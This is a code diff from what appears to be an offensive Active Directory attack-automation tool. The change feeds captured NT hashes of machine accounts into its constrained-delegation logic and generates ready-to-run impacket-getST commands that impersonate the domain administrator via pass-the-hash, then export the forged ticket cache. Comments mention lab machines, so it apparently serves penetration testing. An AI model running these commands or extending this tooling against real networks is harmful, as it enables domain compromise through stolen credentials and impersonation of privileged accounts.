@@ -740,7 +740,22 @@ def run(report, store, ui=None):
                 (ev.meta or {}).get("trusted_to_auth", False))
     if delegators:
         seen_c = set()
-        for (ulc, pw), occurrences in e.creds.items():
+        # iter-95: also feed in delegator NT hashes so a machine account with
+        # AllowedToDelegateTo (very common - a service host's own SPN list)
+        # produces R-CONSTRAINED even when only its hash is owned. Zip creds
+        # + hashes into one iterable so downstream logic stays uniform.
+        _cand = list(e.creds.items())
+        for _hash, _occs in e.nt.items():
+            for _huser, _hs, _hl in _occs:
+                if not _huser:
+                    continue
+                _hulc = _huser.strip().lower()
+                if not _hulc:
+                    continue
+                # Represent hash auth as pw prefixed with ':' (impacket -hashes
+                # LM:NT format); downstream splits on ':' to reconstruct.
+                _cand.append(((_hulc, f":{_hash}"), [(_huser, _hs, _hl)]))
+        for (ulc, pw), occurrences in _cand:
             if ulc not in delegators or ulc in seen_c:
                 continue
             seen_c.add(ulc)
@@ -833,8 +848,18 @@ def run(report, store, ui=None):
                     *([_t2a_note] if _t2a_note else []),
                     # iter-60: -dc-ip anchors KDC discovery on lab boxes
                     # without functional DNS resolution.
-                    f"impacket-getST -spn '{first_spn}' -impersonate administrator "
-                    f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'",
+                    # iter-95: switch to -hashes syntax when pw starts with ':'
+                    # (hash-only auth, used for machine accounts with known NT
+                    # hash but no plaintext). impacket wants LM:NT with a
+                    # blank LM = aad3b435b51404eeaad3b435b51404ee; leading ':'
+                    # form is accepted too but the explicit blank-LM form is
+                    # clearest for the operator.
+                    (f"impacket-getST -spn '{first_spn}' -impersonate administrator "
+                     f"-dc-ip {_dc_c} -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}' "
+                     f"'{_dom_c}/{ulc}'"
+                     if pw.startswith(":") else
+                     f"impacket-getST -spn '{first_spn}' -impersonate administrator "
+                     f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'"),
                     f"export KRB5CCNAME=administrator.ccache",
                     *_followup,
                 ], src=best_src, line=best_line))
